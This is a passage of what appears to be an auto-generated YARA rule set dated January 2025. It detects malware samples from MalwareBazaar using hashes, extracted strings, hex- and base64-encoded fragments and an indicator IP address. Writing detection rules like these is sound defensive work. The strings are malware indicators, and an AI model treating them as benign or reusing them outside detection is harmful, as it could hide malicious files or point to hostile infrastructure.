      $s4 = "EVP_PKEY_get0_siphash" fullword ascii
      $s5 = "process_pci_value" fullword ascii
      $s6 = "process_include" fullword ascii
      $s7 = "EVP_PKEY_get_raw_private_key" fullword ascii
      $s8 = "OSSL_STORE_INFO_get1_NAME_description" fullword ascii
      $s9 = "EVP_PKEY_get_raw_public_key" fullword ascii
      $s10 = "ambiguous host or service" fullword ascii
      $s11 = "log conf missing key" fullword ascii
      $s12 = "ssl command section empty" fullword ascii
      $s13 = "ladder post failure" fullword ascii
      $s14 = "no hostname or service specified" fullword ascii
      $s15 = "malformed host or service" fullword ascii
      $s16 = "ssl command section not found" fullword ascii
      $s17 = "log conf invalid key" fullword ascii
      $s18 = "log key invalid" fullword ascii
      $s19 = "operation fail" fullword ascii
      $s20 = "get raw key failed" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364_48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520_3 {
   meta:
      description = "evidences - from files 0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364.msi, 48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418.msi, 5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756.msi, 907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0df02e130512613f06d1ebbc6aff158ca514ff65806a7ca978cfb9cdbce76364"
      hash2 = "48c55a1c602eb9775660ab39122d7214882bd8a2f5edfb7bd710d90520856418"
      hash3 = "5b0dfa8f066cbafde8f04e6d6f3f3290c5ee78c2209aa8c19e0cda32e8b64756"
      hash4 = "907df555680a7f883b8768c9c2e058002e938e41fbc267394a212337ac635bbb"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "vIjt:\"" fullword ascii
      $s3 = "&?_Y- -" fullword ascii
      $s4 = "roductCode{B3078164-3EC9-4C08-A714-527D4AA49225}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s5 = " )@2!];?A" fullword ascii /* hex encoded string '*' */
      $s6 = "+,+4)-c\\" fullword ascii /* hex encoded string 'L' */
      $s7 = "f:\\/Yk" fullword ascii
      $s8 = "109.0.79.79" fullword wide
      $s9 = "X+ N1R" fullword ascii
      $s10 = "lTWsie8" fullword ascii
      $s11 = "ms90ZWw" fullword ascii
      $s12 = "z4?w+ N" fullword ascii
      $s13 = "8p -iY" fullword ascii
      $s14 = ",w&%vk%" fullword ascii
      $s15 = ",Z!+ n" fullword ascii
      $s16 = "9]Y%nJS%" fullword ascii
      $s17 = "} /m!ZnT/C" fullword ascii
      $s18 = "bZpmIP8" fullword ascii
      $s19 = " /u&*s" fullword ascii
      $s20 = ")L`- )" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _6ceea753d0dc16cbd140271cc52e4e37113e299bc62a83150d33662830c68578_afaa6ce46908258e8fe8f1cc0c312b203872e4b8dd12f41fe938879bc6_4 {
   meta:
      description = "evidences - from files 6ceea753d0dc16cbd140271cc52e4e37113e299bc62a83150d33662830c68578.unknown, afaa6ce46908258e8fe8f1cc0c312b203872e4b8dd12f41fe938879bc629ae5b.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6ceea753d0dc16cbd140271cc52e4e37113e299bc62a83150d33662830c68578"
      hash2 = "afaa6ce46908258e8fe8f1cc0c312b203872e4b8dd12f41fe938879bc629ae5b"
   strings:
      $x1 = "</style><meta data-hydrostats=\"publish\"/> <!-- --> <!-- --> <button hidden=\"\" data-testid=\"header-permalink-button\" data-h" ascii
      $x2 = "  <script type=\"application/json\" data-target=\"react-partial.embeddedData\">{\"props\":{\"docsUrl\":\"https://docs.github.com" ascii
      $s3 = "  <script type=\"application/json\" data-target=\"react-partial.embeddedData\">{\"props\":{\"docsUrl\":\"https://docs.github.com" ascii
      $s4 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary\" data-analytics-event=\"{&quo" ascii
      $s5 = "<script crossorigin=\"anonymous\" defer=\"defer\" type=\"application/javascript\" src=\"https://github.githubassets.com/assets/k" ascii
      $s6 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s7 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s8 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s9 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s10 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s11 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s12 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s13 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s14 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s15 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link-" ascii
      $s16 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external\" target=\"_bla" ascii
      $s17 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external\" target=\"_bla" ascii
      $s18 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external\" target=\"_bla" ascii
      $s19 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external\" target=\"_bla" ascii
      $s20 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external\" target=\"_bla" ascii
   condition:
      ( uint16(0) == 0x0a0a and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429_fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba_5 {
   meta:
      description = "evidences - from files 31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429.unknown, fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429"
      hash2 = "fb6fb7071f914ed1ca1ae11ca6b822b1f43ddee0d8ebd075587f2bebba99db2d"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s2 = "AAAAAAAAAACB" ascii /* base64 encoded string '        ' */
      $s3 = "AAAAAABAAA" ascii /* base64 encoded string '     @ ' */
      $s4 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s5 = "AAAAAAAAAAAAAF" ascii /* base64 encoded string '          ' */
      $s6 = "AAAAAEAAAA" ascii /* base64 encoded string '    @  ' */
      $s7 = "AAAAAAAAAADC" ascii /* base64 encoded string '       0' */
      $s8 = "EAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s9 = "AAAAAAAAAEBAAAA" ascii /* base64 encoded string '       @@  ' */
      $s10 = "ADAAAAAAAAAA" ascii /* base64 encoded string ' 0       ' */
      $s11 = "AAEAAAAAAAAA" ascii /* base64 encoded string ' @      ' */
      $s12 = "AAAAAAAAAAFD" ascii /* base64 encoded string '       P' */
      $s13 = "AAAAAAABAAEAAAAAA" ascii /* base64 encoded string '     @ @    ' */
      $s14 = "AAAAAAAAAACC" ascii /* base64 encoded string '        ' */
      $s15 = "AAAAAAAAAEA" ascii /* base64 encoded string '       @' */
      $s16 = "AAAAAFAAAD" ascii /* base64 encoded string '    P  ' */
      $s17 = "AAAAAAAAAABC" ascii /* base64 encoded string '        B' */
      $s18 = "DAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s19 = "AAAAAAEFFAEAAAAAA" ascii /* base64 encoded string '    AE @    ' */
      $s20 = "AAAAAAAAAABAA" ascii /* base64 encoded string '        @' */
   condition:
      ( ( uint16(0) == 0xd8ff or uint16(0) == 0x413d ) and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3_6 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "ff2284b9e11c03d98b7f91f037fedc26c38e54fa89a278c44057a827a3bb44d1"
   strings:
      $s1 = "xinput1_2.dll" fullword ascii
      $s2 = "xinput1_1.dll" fullword ascii
      $s3 = "Sort=%d%c%n" fullword ascii
      $s4 = "nt(0d=j.LQf./Ll33+(;q3L-w=8dX$#WF&uIJ@-bfI>%:_i2B5CsR8&9Z&#=mPEnm0f`<&c)QL5uJ#%u%lJj+D-r;BoF&#4DoS97h5g)E#o:&S4weDF,9^Hoe`h*L+_a" ascii
      $s5 = "Order=%d%n" fullword ascii
      $s6 = "Width=%d%n" fullword ascii
      $s7 = "Column %d%n" fullword ascii
      $s8 = "brevecombcy" fullword ascii
      $s9 = "Visible=%d%n" fullword ascii
      $s10 = " Sort=%d%c" fullword ascii
      $s11 = "ProggyClean.ttf, %dpx" fullword ascii
      $s12 = "7])#######hV0qs'/###[),##/l:$#Q6>##5[n42>c-TH`->>#/e>11NNV=Bv(*:.F?uu#(gRU.o0XGH`$vhLG1hxt9?W`#,5LsCp#-i>.r$<$6pD>Lb';9Crc6tgXmK" ascii
      $s13 = "Size=%i,%i" fullword ascii
      $s14 = "Size=%d,%d" fullword ascii
      $s15 = "#6654&#\"" fullword ascii /* hex encoded string 'fT' */
      $s16 = "'>()jLR-^u68PHm8ZFWe+ej8h:9r6L*0//c&iH&R8pRbA#Kjm%upV1g:a_#Ur7FuA#(tRh#.Y5K+@?3<-8m0$PEn;J:rh6?I6uG<-`wMU'ircp0LaE_OtlMb&1#6T.#F" ascii
      $s17 = "'\"&&546632" fullword ascii /* hex encoded string 'Tf2' */
      $s18 = "K&/.?-V%U_%3:qKNu$_b*B-kp7NaD'QdWQPKYq[@>P)hI;*_F]u`Rb[.j8_Q/<&>uu+VsH$sM9TA%?)(vmJ80),P7E>)tjD%2L=-t#fK[%`v=Q8<FfNkgg^oIbah*#8/" ascii
      $s19 = "DKu#1Lw%u%+GM+X'e?YLfjM[VO0MbuFp7;>Q&#WIo)0@F%q7c#4XAXN-U&VB<HFF*qL($/V,;(kXZejWO`<[5??ewY(*9=%wDc;,u<'9t3W-(H1th3+G]ucQ]kLs7df(" ascii
      $s20 = "Weight=%f%n" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4_5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95_7 {
   meta:
      description = "evidences - from files 468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4.msi, 5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "468ff3b01cb98f3bb68e99b07d04c29869abc2e5c4ba3b8f075658e6121d0cd4"
      hash2 = "5e404a3ac0f71c114f4a3a9f02d6fda1e37cc0872320499eefadfb8d95abe8b9"
   strings:
      $s1 = "Manufacturer" fullword wide /* Goodware String - occured 392 times */
      $s2 = "permission_denied" fullword ascii /* Goodware String - occured 555 times */
      $s3 = "network_down" fullword ascii /* Goodware String - occured 555 times */
      $s4 = "network_unreachable" fullword ascii /* Goodware String - occured 555 times */
      $s5 = "wrong_protocol_type" fullword ascii /* Goodware String - occured 555 times */
      $s6 = "host_unreachable" fullword ascii /* Goodware String - occured 555 times */
      $s7 = "connection_already_in_progress" fullword ascii /* Goodware String - occured 555 times */
      $s8 = "connection_refused" fullword ascii /* Goodware String - occured 555 times */
      $s9 = "network_reset" fullword ascii /* Goodware String - occured 555 times */
      $s10 = "not_connected" fullword ascii /* Goodware String - occured 555 times */
      $s11 = "protocol_not_supported" fullword ascii /* Goodware String - occured 555 times */
      $s12 = "already_connected" fullword ascii /* Goodware String - occured 555 times */
      $s13 = "connection_aborted" fullword ascii /* Goodware String - occured 558 times */
      $s14 = "network down" fullword ascii /* Goodware String - occured 567 times */
      $s15 = "wrong protocol type" fullword ascii /* Goodware String - occured 567 times */
      $s16 = "owner dead" fullword ascii /* Goodware String - occured 567 times */
      $s17 = "network reset" fullword ascii /* Goodware String - occured 567 times */
      $s18 = "connection aborted" fullword ascii /* Goodware String - occured 568 times */
      $s19 = "network unreachable" fullword ascii /* Goodware String - occured 569 times */
      $s20 = "host unreachable" fullword ascii /* Goodware String - occured 571 times */
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550_e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf_8 {
   meta:
      description = "evidences - from files 6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550.rar, e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550"
      hash2 = "e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782"
   strings:
      $s1 = "dfimosu" fullword ascii
      $s2 = "WUSOMKIG" fullword ascii
      $s3 = "Xmonopr" fullword ascii
      $s4 = "t=H- 8M" fullword ascii
      $s5 = "cyvgew" fullword ascii
      $s6 = "\\A2%h;" fullword ascii
      $s7 = "%HcQQ!" fullword ascii
      $s8 = "zFJNm6." fullword ascii
      $s9 = "~tuvGHeT" fullword ascii
      $s10 = "GPuTD\"WW`Eg" fullword ascii
      $s11 = "4%I(tN" fullword ascii
      $s12 = "&uDJsRZ^" fullword ascii
      $s13 = "Q<I.ATf" fullword ascii
      $s14 = "shIMW\"" fullword ascii
      $s15 = "dXwNI>." fullword ascii
      $s16 = "rfjns;;=?" fullword ascii
      $s17 = "]XkPyB)w" fullword ascii
      $s18 = "yZpzXli" fullword ascii
      $s19 = "^pvDD\"7vpX" fullword ascii
      $s20 = "\\V:]7D" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf_54da5d4894b911271565a32af73e2ef62391ecb5758508bd896b978780_9 {
   meta:
      description = "evidences - from files 0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf.apk, 54da5d4894b911271565a32af73e2ef62391ecb5758508bd896b978780c6906e.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "0c1b7c2142c7eae7c7cd0324f00868336ec01eaa2f0a272169e1f775c371cfbf"
      hash2 = "54da5d4894b911271565a32af73e2ef62391ecb5758508bd896b978780c6906e"
   strings:
      $s1 = "res/layout/custom_dialog.xml" fullword ascii
      $s2 = "))Widget.Compat.NotificationActionContainer" fullword ascii
      $s3 = "$$Widget.Compat.NotificationActionText" fullword ascii
      $s4 = "55res/layout/notification_template_part_chronometer.xml" fullword ascii
      $s5 = "//res/layout/notification_template_custom_big.xml" fullword ascii
      $s6 = ".note.gnu.gold-version" fullword ascii
      $s7 = "tag_state_description" fullword ascii
      $s8 = "res/layout/notification_template_custom_big.xml" fullword ascii
      $s9 = "//res/layout/notification_template_icon_group.xml" fullword ascii
      $s10 = "_ZN7_JNIEnv17GetStringUTFCharsEP8_jstringPh" fullword ascii
      $s11 = "res/layout/custom_dialog.xmlu" fullword ascii
      $s12 = "__android_log_print" fullword ascii
      $s13 = "custom_dialog" fullword ascii
      $s14 = "tag_accessibility_heading" fullword ascii
      $s15 = "res/layout/custom_dialog.xmlPK" fullword ascii
      $s16 = "liblog.so" fullword ascii
      $s17 = "drawable" fullword wide
      $s18 = "&&notification_template_part_chronometer" fullword ascii
      $s19 = "((TextAppearance.Compat.Notification.Line2" fullword ascii
      $s20 = "\"\"TextAppearance.Compat.Notification" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb_87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f_10 {
   meta:
      description = "evidences - from files 100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb.exe, 87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba.exe, bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "100406a9da5c039f752afa40a136f6e03cd6fe9d8c2d9f1c47362e4dddc263cb"
      hash2 = "87374fe6088ffe47d90d6de599aeeb8784ef0334c6d159fdeec2df3a2f92d9ba"
      hash3 = "bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2"
   strings:
      $s1 = ".Wqb^?" fullword ascii
      $s2 = "VIgq qC:" fullword ascii
      $s3 = "VbfOc,p" fullword ascii
      $s4 = "hloav\\" fullword ascii
      $s5 = "D.Hog^" fullword ascii
      $s6 = "BvVlZ\\" fullword ascii
      $s7 = "c2\\f?C" fullword ascii
      $s8 = "#k+ka\\T" fullword ascii
      $s9 = "*D]WO\"#y&" fullword ascii
      $s10 = "TXJw^{" fullword ascii
      $s11 = "oad2:," fullword ascii
      $s12 = "CGP%AI" fullword ascii
      $s13 = "^.om5r" fullword ascii
      $s14 = "N5dIn9" fullword ascii
      $s15 = "V<\"+u~" fullword ascii
      $s16 = "8TZvrv<" fullword ascii
      $s17 = "6r-m_v" fullword ascii
      $s18 = "[`|bJj" fullword ascii
      $s19 = "fdxfv%" fullword ascii
      $s20 = "s6!TYK" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _dc032be1c81bf6149441b83be4bc12b8cef20255ec60f49e5778968c8004674c_df215a01f6a83014a148c6e407cdc8422e9119a88b4220a1321b2986ea_11 {
   meta:
      description = "evidences - from files dc032be1c81bf6149441b83be4bc12b8cef20255ec60f49e5778968c8004674c.html, df215a01f6a83014a148c6e407cdc8422e9119a88b4220a1321b2986ea9aef63.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "dc032be1c81bf6149441b83be4bc12b8cef20255ec60f49e5778968c8004674c"
      hash2 = "df215a01f6a83014a148c6e407cdc8422e9119a88b4220a1321b2986ea9aef63"
   strings:
      $s1 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%45%76%48%74%46%75%50%4c%2f%38%57%52%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%KEvHtFuPL/8WR-'%K-'%K-'%K-'' */
      $s2 = "45%35%59%2a%55%26%5c%71%49%3c%54%25%52%48%49%52%3a%4d%56%53%32%51%29%32%58%57%38%36%2d%52%2b%37%6b%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'E5Y*U&\qI<T%RHIR:MVS2Q)2XW86-R+7kcccccccccc' */
      $s3 = "58%5e%26%34%33%31%2e%45%26%2d%28%2b%49%45%35%59%2a%55%26%5c%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'X^&431.E&-(+IE5Y*U&\ccccccccccccccccccccccc' */
      $s4 = "54%46%52%35%59%48%51%2e%38%2d%4b%21%21%6a%6e%3f%27%2c%45%36%41%73%5c%75%75%6e%6a%6c%6c%6a%6c%6c%6c%65%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'TFR5YHQ.8-K!!jn?',E6As\uunjlljllleccccccccc' */
      $s5 = "58%45%63%4c%58%58%54%70%49%55%59%4d%5a%21%65%3c%70%39%25%70%27%53%51%54%45%58%4d%46%50%49%65%63%47%53%52%58%49%52%58%21%65%2d%29" ascii /* hex encoded string 'XEcLXXTpIUYMZ!e<p9%p'SQTEXMFPIecGSRXIRX!e-)' */
      $s6 = "4d%47%4b%5b%34%3d%49%26%32%2d%25%3b%35%37%48%49%3e%28%25%5a%5a%5c%28%4e%5c%5e%54%37%4c%2a%27%59%34%3e%32%4b%39%4e%3b%25%51%37%3c" ascii /* hex encoded string 'MGK[4=I&2-%;57HI>(%ZZ\(N\^T7L*'Y4>2K9N;%Q7<' */
      $s7 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%2d%52%5a%53%4f%29%70%49%3c%34%36%49%57" ascii /* hex encoded string 'cccccccccccccccccccccccccccccc-RZSO)pI<46IW' */
      $s8 = "30%45%48%25%3d%4f%3a%3e%35%4c%34%5d%56%45%53%46%39%3c%3e%2b%4d%50%4d%58%55%2c%5c%4b%5e%4d%47%4b%5b%34%3d%49%26%32%2d%25%3b%35%37" ascii /* hex encoded string '0EH%=O:>5L4]VESF9<>+MPMXU,\K^MGK[4=I&2-%;57' */
      $s9 = "33%29%2e%50%2f%39%2e%2e%4c%59%45%5a%4a%53%4f%2b%26%4b%28%49%2d%25%58%39%30%45%48%25%3d%4f%3a%3e%35%4c%34%5d%56%45%53%46%39%3c%3e" ascii /* hex encoded string '3).P/9..LYEZJSO+&K(I-%X90EH%=O:>5L4]VESF9<>' */
      $s10 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%30%3a%26%4c%47%76" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K0:&LGv' */
      $s11 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%29%2a%4f%36%27" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-)*O6'' */
      $s12 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%70%47%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccccccccccccccccpGcccccccccccccccccc' */
      $s13 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%6c%63%63%63%63%63%63%63" ascii /* hex encoded string 'ccccccccccccccccccccccccccccccccccclccccccc' */
      $s14 = "48%2f%3d%5a%4c%3d%3d%4f%31%2b%38%4d%4a%46%57%35%45%3c%3c%50%2c%39%3d%38%31%2b%39%3e%46%48%33%38%37%56%4a%31%3d%49%31%25%37%47%50" ascii /* hex encoded string 'H/=ZL==O1+8MJFW5E<<P,9=81+9>FH387VJ1=I1%7GP' */
      $s15 = "4f%51%3e%4f%29%4a%28%55%47%29%33%45%53%4b%2a%57%3c%57%5e%4d%58%35%4c%57%2b%39%30%25%31%45%50%31%52%4c%48%2f%3d%5a%4c%3d%3d%4f%31" ascii /* hex encoded string 'OQ>O)J(UG)3ESK*W<W^MX5LW+90%1EP1RLH/=ZL==O1' */
      $s16 = "58%39%73%5c%50%36%3c%25%53%31%5d%4f%7a%45%39%78%3b%38%73%58%50%30%3b%3a%3d%47%2c%2e%2a%39%74%32%54%38%75%77%4b%2d%27%25%4b%2d%27" ascii /* hex encoded string 'X9s\P6<%S1]OzE9x;8sXP0;:=G,.*9t2T8uwK-'%K-'' */
      $s17 = "63%63%63%63%63%63%63%63%63%63%63%63%6b%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccccckcccccccccccccccccccccccccccccc' */
      $s18 = "54%56%31%5a%58%5d%5e%3b%32%2c%49%3b%2d%2c%53%3e%34%26%3c%53%50%26%5b%2a%4d%50%4b%29%55%36%55%4f%51%3e%4f%29%4a%28%55%47%29%33%45" ascii /* hex encoded string 'TV1ZX]^;2,I;-,S>4&<SP&[*MPK)U6UOQ>O)J(UG)3E' */
      $s19 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'ccccccccccccccccccccccccccccccccccccccccccc' */
      $s20 = "63%63%63%63%63%63%63%63%63%63%65%57%27%56%4d%34%38%71%57%2c%49%30%30%65%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccceW'VM48qW,I00eccccccccccccccccccc' */
   condition:
      ( uint16(0) == 0x733c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630_50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a4_12 {
   meta:
      description = "evidences - from files 4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630.elf, 50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "4d3abd31ce845bf66671548917645ac0bc7c4f6a42127c782121669fe58d7630"
      hash2 = "50dad45e91f61043118a822c13316171108c676db874ab5cfc77f149a41eba9f"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */
      $s2 = "Payload Too Large" fullword ascii
      $s3 = "Already Reported" fullword ascii
      $s4 = "St19_Sp_make_shared_tag" fullword ascii
      $s5 = ".note.ABI-tag" fullword ascii
      $s6 = "NSt6thread6_StateE" fullword ascii
      $s7 = "AVAUATUSH" fullword ascii
      $s8 = "AUATUSH" fullword ascii
      $s9 = "AWAVAUATL" fullword ascii
      $s10 = "AVAUATL" fullword ascii
      $s11 = "AWAVAUATI" fullword ascii
      $s12 = "AVAUATA" fullword ascii
      $s13 = "AVAUATI" fullword ascii
      $s14 = "AWAVAUATE1" fullword ascii
      $s15 = "Accepted" fullword ascii /* Goodware String - occured 64 times */
      $s16 = "Unauthorized" fullword ascii /* Goodware String - occured 90 times */
      $s17 = "Forbidden" fullword ascii /* Goodware String - occured 99 times */
      $s18 = "CONNECT" fullword ascii /* Goodware String - occured 205 times */
      $s19 = "Number of NFA states exceeds limit. Please use shorter regex string, or use smaller brace expression, or make _GLIBCXX_REGEX_STA" ascii
      $s20 = "vector::_M_default_append" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677_5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41d_13 {
   meta:
      description = "evidences - from files 206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677.elf, 5ccf7e6168441fe093292f56d68a9186cdbc7b5c41615e5d27d39ac41dc61f24.elf, 6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
